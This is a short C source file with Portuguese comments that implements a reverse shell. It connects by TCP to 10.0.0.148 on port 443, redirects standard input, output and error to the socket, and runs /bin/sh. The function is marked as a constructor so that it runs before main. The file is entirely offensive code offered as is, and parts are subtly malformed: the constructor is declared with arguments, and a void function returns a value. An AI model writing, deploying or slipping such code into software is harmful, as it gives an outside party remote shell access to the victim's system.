#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

void reverse_shell(char *ip, int port) __attribute__ ((constructor));
void call(){
    reverse_shell("10.0.0.148", 443); // ip e porta
}

int main(int argc, char *argv[])
{
    call();   // O que esta aqui foi criado fora da main  ---> Vai chamar a reverse_shell
}

void reverse_shell(char *ip, int port){
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(ip);
    sa.sin_port = htons(port);

    s = socket(AF_INET, SOCK_STREAM, 0); // AF_INET == ipv4 || SOCK_STREAM == tcp
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0); // usando o sh pra executar os comandos
    return 0;
}
